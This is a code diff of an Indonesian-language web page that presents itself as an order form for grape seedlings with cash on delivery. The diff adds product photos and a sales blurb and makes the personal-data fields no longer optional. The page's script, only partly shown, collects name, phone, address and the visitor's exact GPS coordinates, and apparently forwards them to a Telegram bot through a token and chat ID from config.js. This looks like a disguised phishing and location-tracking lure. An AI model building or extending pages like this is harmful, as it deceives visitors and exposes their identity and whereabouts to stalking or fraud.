@@ -14,6 +14,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            flex-direction: column; /* Menambahkan ini untuk menyusun konten secara vertikal */
             height: 100vh;
         }
 
@@ -72,6 +73,35 @@
             margin-top: 10px;
         }
 
+        /* Styling untuk foto */
+        .photos {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap; /* Membuat foto melingkar saat layar kecil */
+            margin-top: 20px;
+        }
+
+        .photo {
+            margin: 5px;
+            width: 90px; /* Atur ukuran foto */
+            height: 90px; /* Atur ukuran foto */
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .photo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Memastikan gambar sesuai ukuran kotak */
+        }
+
+        .info {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #333;
+            text-align: center;
+        }
+
         @media (max-width: 600px) {
             .container {
                 padding: 10px;
@@ -86,14 +116,18 @@
                 width: 100%;
                 padding: 10px;
             }
+
+            .photo {
+                width: 70px; /* Atur ukuran foto pada perangkat kecil */
+                height: 70px; /* Atur ukuran foto pada perangkat kecil */
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Pemesanan Produk</h1>
-        <p>Isi data di bawah ini untuk memesan produk (opsional).</p>
-        <!-- Input nama, nomor telepon, dan alamat -->
+        <p>Isi data di bawah ini untuk memesan produk.</p>
         <input type="text" id="nama" placeholder="Nama Lengkap">
         <input type="tel" id="telepon" placeholder="Nomor Telepon">
         <input type="text" id="alamat" placeholder="Alamat Lengkap">
@@ -102,9 +136,19 @@
         <p id="status"></p>
     </div>
 
-    <!-- Muat file konfigurasi -->
-    <script src="config.js"></script>
+    <div class="info">
+        <p>100 RB dapat 5 BIBIT anggur lokal (BISA COD)<br>
+        Silahkan bibit hasil stek batang usia produktif 1 tahun berbuah 🌱 MELAYANI COD BAYAR DI TEMPAT SELURUH INDONESIA 🌱😍 harga 1 bibit 25 ribu beli 5 100.000 ribu</p>
+    </div>
 
+    <div class="photos">
+        <div class="photo"><img src="images/photo1.jpg" alt="Foto 1"></div>
+        <div class="photo"><img src="images/photo2.jpg" alt="Foto 2"></div>
+        <div class="photo"><img src="images/photo3.jpg" alt="Foto 3"></div>
+        <div class="photo"><img src="images/photo4.jpg" alt="Foto 4"></div>
+    </div>
+
+    <script src="config.js"></script>
     <script>
         function sendLocation() {
             const nama = document.getElementById("nama").value;
@@ -124,7 +168,6 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            // Ambil token dan chatId dari file config.js
             const botToken = config.botToken;
             const chatId = config.chatId;
 
